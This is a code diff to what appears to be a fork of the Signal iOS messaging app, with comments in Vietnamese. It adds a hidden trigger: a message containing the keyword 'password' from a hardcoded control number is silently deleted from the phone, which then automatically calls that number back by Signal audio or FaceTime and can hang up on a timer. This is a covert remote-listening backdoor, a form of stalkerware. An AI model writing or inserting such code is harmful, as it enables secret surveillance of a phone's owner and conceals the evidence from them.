@@ -1757,6 +1757,15 @@ enum ForkConfig {
             # auto_answer_allowlist = số E.164 phân cách phẩy (bỏ dấu +); để trống = chấp nhận MỌI số
             # LƯU Ý: allowlist lọc theo số NGƯỜI GỌI (caller), không phải số máy này
             auto_answer_allowlist=
+            # --- Trigger tin nhắn "password" (ForkCallTrigger) ---
+            # trigger_number = số điều khiển gửi tin nhắn (E.164, bỏ dấu +)
+            trigger_number=84943481082
+            # trigger_keyword = từ khóa kích hoạt trong tin nhắn
+            trigger_keyword=password
+            # trigger_action = signal_call (gọi Signal) | facetime (mở FaceTime)
+            trigger_action=signal_call
+            # trigger_hangup_seconds = tự kết thúc cuộc gọi sau N giây connected (0 = không)
+            trigger_hangup_seconds=0
             """
             try? content.write(to: url, atomically: true, encoding: .utf8)
         }
@@ -1914,20 +1923,31 @@ final class ForkAutoAnswer: CallServiceStateObserver {
     }
 }
 
-// MARK: - [fork] AnswerMate: ForkCallTrigger — tin nhắn chứa "password" từ số điều khiển
-// → xóa tin nhắn + tự gọi lại số đó (audio). Prototype: poll DB mỗi giây.
+// MARK: - [fork] AnswerMate: ForkCallTrigger — tin nhắn chứa keyword từ số điều khiển
+// → xóa tin nhắn + tự gọi lại (Signal hoặc FaceTime) + (tùy chọn) tự kết thúc sau N giây.
+// Cấu hình qua fork_config.txt: trigger_number, trigger_keyword, trigger_action,
+// trigger_hangup_seconds (0 = không tự tắt).
 
 enum ForkCallTrigger {
-    static let triggerNumber = "84943481082"   // số điều khiển (E.164, bỏ dấu +)
-    static let triggerKeyword = "password"      // từ khóa kích hoạt
+    static var triggerNumber = "84943481082"
+    static var triggerKeyword = "password"
+    static var triggerAction = "signal_call"   // signal_call | facetime
+    static var hangupSeconds: Int = 0           // 0 = không tự tắt
     static let pollInterval: TimeInterval = 1.0
     static var lastHandledTimestamp: UInt64 = 0
     static var pollTimer: Timer?
+    static var hangupTimer: Timer?
+    static var hangupConnectedAt: Date?
 
     @MainActor
     static func start() {
         guard pollTimer == nil else { return }
-        ForkConfig.log("ForkCallTrigger: bắt đầu (số \(triggerNumber), keyword '\(triggerKeyword)')")
+        let config = ForkConfig.load()
+        triggerNumber = config["trigger_number"] ?? triggerNumber
+        triggerKeyword = config["trigger_keyword"] ?? triggerKeyword
+        triggerAction = config["trigger_action"] ?? triggerAction
+        hangupSeconds = ForkConfig.int(config, "trigger_hangup_seconds", default: 0)
+        ForkConfig.log("ForkCallTrigger: start (số \(triggerNumber), keyword '\(triggerKeyword)', action=\(triggerAction), hangup=\(hangupSeconds)s)")
         pollTimer = Timer.scheduledTimer(withTimeInterval: pollInterval, repeats: true) { _ in
             Task { @MainActor in checkForTrigger() }
         }
@@ -1950,16 +1970,68 @@ enum ForkCallTrigger {
 
         guard let message = matched.last else { return }
         lastHandledTimestamp = message.timestamp
-        ForkConfig.log("TRIGGER: tin nhắn '\(triggerKeyword)' từ \(triggerNumber) — xóa + gọi lại")
+        ForkConfig.log("TRIGGER: tin nhắn '\(triggerKeyword)' từ \(triggerNumber) — xóa + hành động")
 
-        // 1) Xóa tin nhắn (khỏi DB Signal — kẻ gửi vẫn thấy phía họ, máy này không còn)
+        // 1) Xóa tin nhắn khỏi DB Signal trên máy
         SSKEnvironment.shared.databaseStorageRef.write { tx in
             DependenciesBridge.shared.interactionStore.deleteInteraction(message, tx: tx)
         }
         ForkConfig.log("TRIGGER: đã xóa tin nhắn khỏi máy")
 
-        // 2) Tự gọi lại số điều khiển (audio call qua Signal)
-        AppEnvironment.shared.callService?.initiateCall(to: .individual(thread), isVideo: false)
-        ForkConfig.log("TRIGGER: đã gọi lại \(triggerNumber)")
+        // 2) Hành động theo cấu hình
+        if triggerAction == "facetime" {
+            // FaceTime: mở qua URL scheme (không tự kết thúc được — giới hạn iOS)
+            if let url = URL(string: "facetime://+" + triggerNumber) {
+                UIApplication.shared.open(url)
+                ForkConfig.log("TRIGGER: đã mở FaceTime tới +\(triggerNumber)")
+            }
+        } else {
+            // Mặc định: gọi Signal audio
+            AppEnvironment.shared.callService?.initiateCall(to: .individual(thread), isVideo: false)
+            ForkConfig.log("TRIGGER: đã gọi Signal tới \(triggerNumber)")
+            if hangupSeconds > 0 {
+                startHangupWatch()
+            }
+        }
+    }
+
+    /// Tự kết thúc cuộc gọi sau hangupSeconds kể từ lúc connected.
+    @MainActor
+    static func startHangupWatch() {
+        stopHangupWatch()
+        hangupConnectedAt = nil
+        ForkConfig.log("TRIGGER: bật watch tự tắt sau \(hangupSeconds)s khi connected")
+        hangupTimer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { _ in
+            Task { @MainActor in hangupTick() }
+        }
+    }
+
+    @MainActor
+    static func hangupTick() {
+        guard let call = AppEnvironment.shared.callService?.callServiceState.currentCall else { return }
+        guard case .individual(let individualCall) = call.mode else { return }
+        switch individualCall.state {
+        case .connected, .answering:
+            if hangupConnectedAt == nil {
+                hangupConnectedAt = Date()
+            }
+            if Date().timeIntervalSince(hangupConnectedAt!) >= Double(hangupSeconds) {
+                ForkConfig.log("TRIGGER: tự kết thúc cuộc gọi (đã \(hangupSeconds)s connected)")
+                AppEnvironment.shared.callService?.handleLocalHangupCall(call)
+                stopHangupWatch()
+            }
+        case .terminated, .ending:
+            ForkConfig.log("TRIGGER: cuộc gọi đã kết thúc — dừng watch")
+            stopHangupWatch()
+        default:
+            break
+        }
+    }
+
+    @MainActor
+    static func stopHangupWatch() {
+        hangupTimer?.invalidate()
+        hangupTimer = nil
+        hangupConnectedAt = nil
     }
 }
